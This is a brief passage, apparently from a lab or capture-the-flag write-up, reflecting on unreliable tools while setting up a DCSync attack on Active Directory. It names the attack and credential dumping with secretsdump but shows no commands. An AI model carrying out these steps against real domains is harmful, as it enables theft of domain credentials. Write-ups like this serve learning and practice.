Another example of tool unreliability was the setup of the DCSync attack: initially I did not want to create a new user, I wanted to add the svc-alfresco user to the 'Exchange' group.  
The procedure seemed to work as the commands printed messages like "command completed successfully", but when I double-checked the expected results it was clear that the commands had no effect and the secretsdump command failed. Working with a newly created user was the way to go since the same commands worked perfectly.  
In short, when it comes to tools, it's better to adopt a "trust but verify" kind of approach and, when in doubt, use different tools for the same task.
